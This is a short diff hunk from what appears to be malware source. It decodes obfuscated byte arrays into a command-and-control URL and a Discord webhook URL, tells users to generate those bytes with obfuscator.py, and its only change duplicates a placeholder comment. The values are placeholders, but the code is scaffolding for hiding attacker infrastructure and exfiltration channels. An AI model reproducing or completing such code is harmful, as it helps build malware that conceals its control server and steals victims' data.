@@ -35,7 +35,7 @@ def _xd(d, s="k3ycu5t0m", r=4):
     return bytes(raw[:ol]).decode()
 
 # Use obfuscator.py to generate your byte arrays
-_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE
+_C2_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
 C2_URL = _xd(_C2_ENC)
 _WH_ENC = bytes([0x00])
 DISCORD_WEBHOOK_URL = _xd(_WH_ENC)
